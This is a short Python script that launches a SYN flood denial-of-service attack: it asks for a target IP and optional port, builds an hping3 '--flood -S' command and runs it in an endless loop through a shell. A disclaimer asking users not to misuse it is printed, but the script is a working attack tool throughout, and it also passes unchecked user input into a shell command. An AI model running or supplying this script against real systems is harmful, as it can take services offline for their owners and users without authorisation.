import subprocess

ip = input("Enter the IP address to ping: ")
port = input("Enter the port number to ping (leave empty for none): ")

# Build command depending on whether port was given
if port.strip() == "":
    cmd = f"hping3 --flood -S {ip}"
else:
    cmd = f"hping3 --flood -S -p {port} {ip}"

print("Please do not use this script for malicious purposes. Ensure you have permission to perform this action on the target system. (This is a wish, and non binding. The author is not responsible for any misuse of this script.)")
confirm = input(f"Are you sure you want to flood {ip}{':' + port if port else ''}? (y/n): ")

if confirm.lower() != "y":
    print("Operation cancelled.")
    exit()

def payload():
    while True:
        subprocess.run(cmd, capture_output=True, text=True, shell=True)

print("Starting the flood attack...")
payload()
